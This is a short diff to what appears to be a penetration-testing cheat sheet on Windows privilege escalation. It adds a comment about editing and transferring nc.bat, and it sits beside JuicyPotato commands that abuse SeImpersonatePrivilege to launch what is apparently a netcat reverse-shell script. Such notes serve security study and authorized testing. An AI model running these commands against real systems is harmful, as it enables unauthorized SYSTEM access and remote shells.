@@ -248,6 +248,7 @@ Windows CLSIDs: http://ohpe.it/juicy-potato/CLSID/
 
 JuicyPotato - `SeImpersonatePrivilege` or `SeAssignPrimaryPrivilege` is enabled
 ```
+# Edit nc.bat with correct params and transfer to remote host
 cmd> whoami /privs
 cmd> JuicyPotato.exe -p C:\inetpub\wwwroot\nc.bat -l 443 -t * -c
 ```
